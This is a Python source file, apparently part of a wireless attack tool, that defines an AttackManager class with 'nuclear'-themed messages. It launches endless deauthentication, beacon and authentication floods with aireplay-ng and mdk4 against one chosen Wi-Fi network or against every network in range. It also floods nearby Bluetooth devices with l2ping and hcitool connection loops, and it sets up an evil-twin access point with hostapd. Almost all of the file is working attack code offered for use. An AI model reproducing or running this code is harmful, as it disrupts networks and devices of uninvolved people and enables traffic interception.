#!/usr/bin/env python3

import os
import time
import threading
import subprocess
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []

    def single_target_attack(self):
        """Nuclear single target destruction"""
        print("\033[1;33m[!] ACQUIRING SINGLE TARGET...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] DEPLOYING NUCLEAR STRIKE ON: {target['essid']}\033[0m")
                self.start_single_attack(target)

    def start_single_attack(self, target):
        """Start nuclear attack on single target"""
        self.attack_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[💣] DEPLOYING NUCLEAR WEAPONS...\033[0m")
        
        # Weapon 1: MDK4 Destruction
        print("\033[1;31m[⚡] WEAPON 1: MDK4 DESTRUCTION\033[0m")
        proc1 = self.core.run_command(
            f"while true; do mdk4 {self.core.mon_interface} d -c {target['channel']} 2>/dev/null; sleep 2; done",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: Infinite Deauth
        print("\033[1;31m[⚡] WEAPON 2: INFINITE DEAUTH\033[0m")
        proc2 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface} 2>/dev/null; sleep 1; done", 
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Beacon Flood
        print("\033[1;31m[⚡] WEAPON 3: BEACON FLOOD\033[0m")
        proc3 = self.core.run_command(
            f"while true; do mdk4 {self.core.mon_interface} b -n '{target['essid']}' -c {target['channel']} 2>/dev/null; sleep 3; done",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Weapon 4: Authentication Flood
        print("\033[1;31m[⚡] WEAPON 4: AUTHENTICATION FLOOD\033[0m")
        proc4 = self.core.run_command(
            f"while true; do mdk4 {self.core.mon_interface} a -a {target['bssid']} 2>/dev/null; sleep 2; done",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)} NUCLEAR WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] TARGET {target['essid']} IS BEING DESTROYED\033[0m")
        
        # Start destruction animation
        anim_thread = threading.Thread(target=self.show_destruction_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO CEASE FIRE...\033[0m")
        input()
        
        self.stop_attacks()
        print("\033[1;32m[✓] NUCLEAR ATTACK TERMINATED\033[0m")

    def mass_destruction(self):
        """Nuclear mass destruction - destroy ALL networks"""
        print("\033[1;31m[☢️] INITIATING MASS DESTRUCTION PROTOCOL...\033[0m")
        
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] NO TARGETS FOUND\033[0m")
                return
            
            print(f"\033[1;33m[!] TARGETING {target_count} NETWORKS FOR TOTAL ANNIHILATION\033[0m")
            
            confirm = input("\033[1;31m[?] CONFIRM MASS DESTRUCTION? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.attack_running = True
                
                print("\033[1;31m[💣] DEPLOYING NUCLEAR WARHEADS...\033[0m")
                
                # Attack all networks simultaneously
                for idx, target in self.scanner.networks.items():
                    print(f"\033[1;31m[→] DEPLOYING WARHEAD {idx}: {target['essid']}\033[0m")
                    self.deploy_warhead(target)
                    time.sleep(0.5)
                
                print(f"\033[1;32m[✓] {target_count} NUCLEAR WARHEADS DEPLOYED\033[0m")
                print("\033[1;31m[💥] ALL NETWORKS ARE BEING DESTROYED\033[0m")
                
                # Start animation
                anim_thread = threading.Thread(target=self.show_mass_destruction_animation)
                anim_thread.daemon = True
                anim_thread.start()
                
                print("\033[1;33m[!] PRESS ENTER TO CEASE FIRE...\033[0m")
                input()
                
                self.stop_attacks()
                print("\033[1;32m[✓] MASS DESTRUCTION TERMINATED\033[0m")
            else:
                print("\033[1;33m[!] MASS DESTRUCTION CANCELLED\033[0m")

    def deploy_warhead(self, target):
        """Deploy individual warhead for mass destruction"""
        # Set channel and deploy attacks
        channel_cmd = f"iwconfig {self.core.mon_interface} channel {target['channel']} 2>/dev/null"
        self.core.run_command(channel_cmd)
        
        # Deauth attack
        deauth_cmd = f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-{target['essid']}' -e 'while true; do aireplay-ng --deauth 50 -a {target['bssid']} {self.core.mon_interface} 2>/dev/null; sleep 2; done' &"
        proc = self.core.run_command(deauth_cmd, background=True)
        if proc:
            self.attack_processes.append(proc)
            self.core.add_attack_process(proc)
        
        # MDK4 attack
        mdk_cmd = f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-{target['essid']}' -e 'while true; do mdk4 {self.core.mon_interface} d -c {target['channel']} 2>/dev/null; sleep 3; done' &"
        proc = self.core.run_command(mdk_cmd, background=True)
        if proc:
            self.attack_processes.append(proc)
            self.core.add_attack_process(proc)

    def bluetooth_attack(self):
        """Nuclear Bluetooth destruction"""
        print("\033[1;31m[📱] INITIATING BLUETOOTH DESTRUCTION...\033[0m")
        
        # Check Bluetooth tools
        if not self.core.run_command("which hcitool"):
            print("\033[1;31m[✘] BLUETOOTH TOOLS NOT AVAILABLE\033[0m")
            return
        
        # Enable Bluetooth
        self.core.run_command("systemctl start bluetooth")
        self.core.run_command("hciconfig hci0 up")
        
        # Scan for devices
        devices = self.scanner.bluetooth_scan()
        
        if not devices:
            print("\033[1;31m[✘] NO BLUETOOTH TARGETS FOUND\033[0m")
            return
        
        self.scanner.display_bluetooth_results(devices)
        
        target_mac = input("\n\033[1;33m[?] ENTER BLUETOOTH MAC TO ATTACK: \033[0m").strip()
        
        if target_mac in devices:
            target_name = devices[target_mac]['name']
            print(f"\033[1;31m[💣] DEPLOYING BLUETOOTH NUKES ON: {target_name}\033[0m")
            
            # Attack 1: L2PING Flood
            print("\033[1;31m[⚡] WEAPON 1: L2PING FLOOD\033[0m")
            proc1 = self.core.run_command(
                f"xterm -geometry 80x15 -bg black -fg cyan -title 'BT-L2PING-FLOOD' -e 'while true; do l2ping -f {target_mac} 2>/dev/null; sleep 1; done' &",
                background=True
            )
            if proc1:
                self.attack_processes.append(proc1)
                self.core.add_attack_process(proc1)
            
            # Attack 2: Connection Flood
            print("\033[1;31m[⚡] WEAPON 2: CONNECTION FLOOD\033[0m")
            proc2 = self.core.run_command(
                f"xterm -geometry 80x15 -bg black -fg magenta -title 'BT-CONNECTION-FLOOD' -e 'while true; do hcitool cc {target_mac} 2>/dev/null && hcitool dc {target_mac} 2>/dev/null; sleep 0.3; done' &",
                background=True
            )
            if proc2:
                self.attack_processes.append(proc2)
                self.core.add_attack_process(proc2)
            
            # Attack 3: Packet Flood
            print("\033[1;31m[⚡] WEAPON 3: PACKET FLOOD\033[0m")
            proc3 = self.core.run_command(
                f"xterm -geometry 80x15 -bg black -fg green -title 'BT-PACKET-FLOOD' -e 'while true; do l2ping -s 600 -f {target_mac} 2>/dev/null; sleep 0.5; done' &",
                background=True
            )
            if proc3:
                self.attack_processes.append(proc3)
                self.core.add_attack_process(proc3)
            
            print("\033[1;32m[✓] BLUETOOTH DESTRUCTION ACTIVE\033[0m")
            print("\033[1;33m[!] PRESS ENTER TO STOP ATTACK...\033[0m")
            input()
            
            self.stop_attacks()
            print("\033[1;32m[✓] BLUETOOTH ATTACK TERMINATED\033[0m")
        else:
            print("\033[1;31m[✘] INVALID BLUETOOTH MAC\033[0m")

    def evil_twin_attack(self):
        """Evil Twin attack with NetStrike style"""
        print("\033[1;33m[!] INITIATING EVIL TWIN ATTACK...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[👥] CREATING EVIL TWIN FOR: {target['essid']}\033[0m")
                self.start_evil_twin(target)

    def start_evil_twin(self, target):
        """Start Evil Twin attack"""
        try:
            # Create monitor interface for AP
            print("\033[1;36m[→] CREATING ACCESS POINT...\033[0m")
            
            # Stop NetworkManager to avoid conflicts
            self.core.run_command("systemctl stop NetworkManager")
            
            # Create virtual interface
            self.core.run_command(f"airmon-ng start {self.core.interface}")
            
            # Set up hostapd configuration
            hostapd_conf = f"""
interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}_FREE_WIFI
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
            
            with open("/tmp/hostapd.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Set up DHCP server configuration
            dhcp_conf = """
interface={}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
""".format(self.core.mon_interface)
            
            with open("/tmp/dhcpd.conf", "w") as f:
                f.write(dhcp_conf)
            
            print("\033[1;32m[✓] EVIL TWIN CONFIGURED\033[0m")
            print("\033[1;33m[!] STARTING EVIL TWIN - PRESS CTRL+C TO STOP\033[0m")
            
            # Start hostapd
            hostapd_proc = self.core.run_command("hostapd /tmp/hostapd.conf", background=True)
            
            # Wait for user to stop
            input()
            
            # Cleanup
            if hostapd_proc:
                hostapd_proc.terminate()
            self.core.run_command("systemctl start NetworkManager")
            print("\033[1;32m[✓] EVIL TWIN ATTACK STOPPED\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] EVIL TWIN FAILED: {e}\033[0m")
            self.core.run_command("systemctl start NetworkManager")

    def show_destruction_animation(self):
        """Show destruction animation"""
        frames = ["💣", "🔥", "☢️", "⚡", "💥", "🌋"]
        frame_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            print(f"\033[1;31m[{frame}] NUCLEAR DESTRUCTION IN PROGRESS - TARGET ELIMINATED!\033[0m", end='\r')
            time.sleep(0.3)

    def show_mass_destruction_animation(self):
        """Show mass destruction animation"""
        frames = ["💣", "🔥", "☢️", "⚡", "💥", "🌋", "☠️", "💀"]
        messages = [
            "ANNIHILATING ALL NETWORKS",
            "DEPLOYING NUCLEAR WARHEADS", 
            "TARGETS BEING DESTROYED",
            "MASS DESTRUCTION ACTIVE",
            "NETWORKS ELIMINATED",
            "TOTAL ANNIHILATION"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - ALL TARGETS ELIMINATED!\033[0m", end='\r')
            time.sleep(0.4)

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
